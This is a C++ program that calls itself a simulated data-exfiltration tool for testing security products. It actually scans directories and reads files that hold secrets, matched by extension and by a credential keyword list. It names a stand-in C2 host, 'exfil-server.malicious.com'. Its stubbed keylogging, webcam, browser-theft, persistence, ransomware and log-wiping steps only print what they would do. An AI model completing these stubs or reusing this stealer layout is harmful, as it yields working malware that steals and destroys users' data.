// Suspicious data exfiltration program (FOR TESTING ONLY)
// This is a simulated suspicious C++ program for testing security tools

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <cctype>
#include <ctime>
#include <cstdlib>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

namespace fs = std::filesystem;

// Function prototypes
void print_banner();
void scan_for_sensitive_files(const std::string& directory, std::vector<std::string>& found_files);
bool is_sensitive_file(const std::string& filename, const std::string& content);
std::string read_file(const std::string& filename);
std::string encode_base64(const std::string& input);
bool simulate_exfiltration(const std::string& data, const std::string& server, int port);
void encrypt_file(const std::string& filename);
std::string generate_random_string(size_t length);
void simulate_keylogging();
void simulate_screenshot();
void simulate_webcam_capture();
void simulate_audio_capture();
void simulate_clipboard_monitoring();
void simulate_browser_data_theft();
void simulate_network_scanning();
void simulate_persistence();
void cleanup_traces();

// Configuration (would be obfuscated in a real malware)
struct Config {
    std::string c2_server = "exfil-server.malicious.com";
    int c2_port = 8080;
    std::vector<std::string> sensitive_extensions = {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", 
        ".txt", ".rtf", ".csv", ".json", ".xml", ".cfg", ".conf", 
        ".ini", ".pem", ".key", ".crt", ".cer", ".p12", ".pfx",
        ".sql", ".db", ".sqlite", ".mdb", ".accdb", ".bak",
        ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".avi", ".mov"
    };
    std::vector<std::string> sensitive_keywords = {
        "password", "passwd", "pwd", "secret", "private", "confidential",
        "credit", "card", "ssn", "social", "security", "bank", "account",
        "login", "user", "username", "admin", "root", "key", "token",
        "api", "auth", "oauth", "certificate", "credential", "bitcoin",
        "wallet", "crypto", "salary", "income", "tax", "ssn", "dob",
        "birth", "license", "passport", "id", "address", "phone", "email"
    };
    bool stealth_mode = true;
    bool encrypt_files = false;
    int scan_delay = 1000; // milliseconds
    int exfil_delay = 5000; // milliseconds
    size_t max_file_size = 10485760; // 10 MB
    bool keylogging = true;
    bool screenshot = true;
    bool webcam = true;
    bool audio = true;
    bool clipboard = true;
    bool browser_data = true;
    bool network_scanning = true;
    bool persistence = true;
    bool cleanup = true;
} config;

int main(int argc, char* argv[]) {
    print_banner();
    
    std::cout << "This is a simulated data exfiltration program for testing security tools." << std::endl;
    std::cout << "No actual data exfiltration or malicious actions will be performed." << std::endl;
    std::cout << "--------------------------------------------------------" << std::endl;
    
    // Parse command line arguments
    std::string target_directory = ".";
    if (argc > 1) {
        target_directory = argv[1];
    }
    
    std::cout << "[*] Target directory: " << target_directory << std::endl;
    
    // Simulate persistence
    if (config.persistence) {
        std::cout << "[*] Simulating persistence establishment..." << std::endl;
        simulate_persistence();
    }
    
    // Simulate keylogging
    if (config.keylogging) {
        std::cout << "[*] Simulating keylogging..." << std::endl;
        simulate_keylogging();
    }
    
    // Simulate screenshot
    if (config.screenshot) {
        std::cout << "[*] Simulating screenshot capture..." << std::endl;
        simulate_screenshot();
    }
    
    // Simulate webcam capture
    if (config.webcam) {
        std::cout << "[*] Simulating webcam capture..." << std::endl;
        simulate_webcam_capture();
    }
    
    // Simulate audio capture
    if (config.audio) {
        std::cout << "[*] Simulating audio capture..." << std::endl;
        simulate_audio_capture();
    }
    
    // Simulate clipboard monitoring
    if (config.clipboard) {
        std::cout << "[*] Simulating clipboard monitoring..." << std::endl;
        simulate_clipboard_monitoring();
    }
    
    // Simulate browser data theft
    if (config.browser_data) {
        std::cout << "[*] Simulating browser data theft..." << std::endl;
        simulate_browser_data_theft();
    }
    
    // Simulate network scanning
    if (config.network_scanning) {
        std::cout << "[*] Simulating network scanning..." << std::endl;
        simulate_network_scanning();
    }
    
    // Scan for sensitive files
    std::cout << "[*] Scanning for sensitive files in: " << target_directory << std::endl;
    std::vector<std::string> sensitive_files;
    scan_for_sensitive_files(target_directory, sensitive_files);
    
    std::cout << "[+] Found " << sensitive_files.size() << " potentially sensitive files" << std::endl;
    
    // Process found files
    int files_exfiltrated = 0;
    for (const auto& file : sensitive_files) {
        std::cout << "[*] Processing file: " << file << std::endl;
        
        // Read file content
        std::string content = read_file(file);
        if (content.empty()) {
            std::cout << "[-] Failed to read file or file is empty" << std::endl;
            continue;
        }
        
        // Check if file content is sensitive
        if (is_sensitive_file(file, content)) {
            std::cout << "[+] File contains sensitive information" << std::endl;
            
            // Encode content
            std::string encoded = encode_base64(content);
            std::cout << "[+] Encoded file content (first 20 bytes): " << encoded.substr(0, 20) << "..." << std::endl;
            
            // Simulate exfiltration
            std::cout << "[*] Simulating data exfiltration to " << config.c2_server << ":" << config.c2_port << std::endl;
            bool success = simulate_exfiltration(encoded, config.c2_server, config.c2_port);
            
            if (success) {
                std::cout << "[+] Exfiltration simulation successful" << std::endl;
                files_exfiltrated++;
                
                // Encrypt file if configured
                if (config.encrypt_files) {
                    std::cout << "[*] Simulating file encryption..." << std::endl;
                    encrypt_file(file);
                }
            } else {
                std::cout << "[-] Exfiltration simulation failed" << std::endl;
            }
            
            // Add delay between exfiltrations
            std::cout << "[*] Waiting " << config.exfil_delay << " ms before next file..." << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(config.exfil_delay));
        } else {
            std::cout << "[-] File does not contain sensitive information" << std::endl;
        }
    }
    
    std::cout << "[+] Exfiltration simulation completed" << std::endl;
    std::cout << "[+] Files processed: " << sensitive_files.size() << std::endl;
    std::cout << "[+] Files exfiltrated: " << files_exfiltrated << std::endl;
    
    // Cleanup traces
    if (config.cleanup) {
        std::cout << "[*] Cleaning up traces..." << std::endl;
        cleanup_traces();
    }
    
    std::cout << "--------------------------------------------------------" << std::endl;
    std::cout << "This was a simulation for testing security tools." << std::endl;
    std::cout << "No actual data exfiltration or malicious actions were performed." << std::endl;
    
    return 0;
}

// Print banner
void print_banner() {
    std::cout << R"(
 ____        _          _____      __ _ _
|  _ \  __ _| |_ __ _  | ____|_  _/ _(_) |
| | | |/ _` | __/ _` | |  _| \ \/ / |_| | |
| |_| | (_| | || (_| | | |___ >  <|  _| | |
|____/ \__,_|\__\__,_| |_____/_/\_\_| |_|_|
                                           
    DATA EXFILTRATION SIMULATION TOOL
    FOR TESTING SECURITY TOOLS ONLY
)" << std::endl;
}

// Scan for sensitive files
void scan_for_sensitive_files(const std::string& directory, std::vector<std::string>& found_files) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(directory)) {
            if (fs::is_regular_file(entry)) {
                // Check file size
                if (fs::file_size(entry) > config.max_file_size) {
                    continue;
                }
                
                // Check file extension
                std::string filename = entry.path().string();
                std::string extension = entry.path().extension().string();
                std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                
                if (std::find(config.sensitive_extensions.begin(), config.sensitive_extensions.end(), extension) != config.sensitive_extensions.end()) {
                    found_files.push_back(filename);
                    std::cout << "[+] Found potentially sensitive file: " << filename << std::endl;
                }
                
                // Add delay between file checks
                std::this_thread::sleep_for(std::chrono::milliseconds(config.scan_delay));
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "[-] Error scanning directory: " << e.what() << std::endl;
    }
}

// Check if file is sensitive
bool is_sensitive_file(const std::string& filename, const std::string& content) {
    // Convert content to lowercase for case-insensitive search
    std::string lower_content = content;
    std::transform(lower_content.begin(), lower_content.end(), lower_content.begin(), ::tolower);
    
    // Check for sensitive keywords
    for (const auto& keyword : config.sensitive_keywords) {
        if (lower_content.find(keyword) != std::string::npos) {
            std::cout << "[+] Found sensitive keyword: " << keyword << std::endl;
            return true;
        }
    }
    
    // Additional checks could be implemented here
    
    return false;
}

// Read file content
std::string read_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "[-] Failed to open file: " << filename << std::endl;
        return "";
    }
    
    return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// Base64 encoding
std::string encode_base64(const std::string& input) {
    // This is a simplified base64 encoding for simulation purposes
    // In a real scenario, a proper base64 implementation would be used
    
    // Just return the original string with a prefix for simulation
    return "BASE64:" + input.substr(0, std::min(size_t(100), input.size())) + "...";
}

// Simulate data exfiltration
bool simulate_exfiltration(const std::string& data, const std::string& server, int port) {
    // This is a simulation - no actual data is sent
    // In a real scenario, this would establish a connection and send data
    
    std::cout << "[*] Would connect to: " << server << ":" << port << std::endl;
    std::cout << "[*] Would send " << data.size() << " bytes of data" << std::endl;
    
    // Simulate success or failure
    return (rand() % 100) < 95; // 95% success rate
}

// Simulate file encryption
void encrypt_file(const std::string& filename) {
    // This is a simulation - no actual encryption is performed
    // In a real scenario, this would encrypt the file with a strong algorithm
    
    std::cout << "[*] Would encrypt file: " << filename << std::endl;
    std::cout << "[*] Would generate ransom note" << std::endl;
}

// Generate random string
std::string generate_random_string(size_t length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> distribution(0, chars.size() - 1);
    
    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += chars[distribution(generator)];
    }
    
    return result;
}

// Simulate keylogging
void simulate_keylogging() {
    std::cout << "[*] Would start keylogger thread" << std::endl;
    std::cout << "[*] Would log keystrokes to memory buffer" << std::endl;
    std::cout << "[*] Would periodically exfiltrate keystrokes" << std::endl;
}

// Simulate screenshot
void simulate_screenshot() {
    std::cout << "[*] Would capture screenshot" << std::endl;
    std::cout << "[*] Would compress screenshot" << std::endl;
    std::cout << "[*] Would exfiltrate screenshot data" << std::endl;
}

// Simulate webcam capture
void simulate_webcam_capture() {
    std::cout << "[*] Would access webcam" << std::endl;
    std::cout << "[*] Would capture image" << std::endl;
    std::cout << "[*] Would compress image" << std::endl;
    std::cout << "[*] Would exfiltrate webcam data" << std::endl;
}

// Simulate audio capture
void simulate_audio_capture() {
    std::cout << "[*] Would access microphone" << std::endl;
    std::cout << "[*] Would record audio" << std::endl;
    std::cout << "[*] Would compress audio" << std::endl;
    std::cout << "[*] Would exfiltrate audio data" << std::endl;
}

// Simulate clipboard monitoring
void simulate_clipboard_monitoring() {
    std::cout << "[*] Would start clipboard monitoring thread" << std::endl;
    std::cout << "[*] Would capture clipboard changes" << std::endl;
    std::cout << "[*] Would exfiltrate clipboard data" << std::endl;
}

// Simulate browser data theft
void simulate_browser_data_theft() {
    std::cout << "[*] Would locate browser data directories" << std::endl;
    std::cout << "[*] Would extract cookies" << std::endl;
    std::cout << "[*] Would extract saved passwords" << std::endl;
    std::cout << "[*] Would extract browsing history" << std::endl;
    std::cout << "[*] Would extract autofill data" << std::endl;
    std::cout << "[*] Would exfiltrate browser data" << std::endl;
}

// Simulate network scanning
void simulate_network_scanning() {
    std::cout << "[*] Would scan local network" << std::endl;
    std::cout << "[*] Would identify other devices" << std::endl;
    std::cout << "[*] Would scan for open ports" << std::endl;
    std::cout << "[*] Would attempt to identify services" << std::endl;
    std::cout << "[*] Would exfiltrate network map" << std::endl;
}

// Simulate persistence
void simulate_persistence() {
#ifdef _WIN32
    std::cout << "[*] Would add registry key for startup" << std::endl;
    std::cout << "[*] Would create scheduled task" << std::endl;
    std::cout << "[*] Would install service" << std::endl;
#else
    std::cout << "[*] Would add to crontab" << std::endl;
    std::cout << "[*] Would create systemd service" << std::endl;
    std::cout << "[*] Would modify shell startup scripts" << std::endl;
#endif
    std::cout << "[*] Would create backup copies in multiple locations" << std::endl;
}

// Cleanup traces
void cleanup_traces() {
    std::cout << "[*] Would clear logs" << std::endl;
    std::cout << "[*] Would remove temporary files" << std::endl;
    std::cout << "[*] Would clear command history" << std::endl;
}
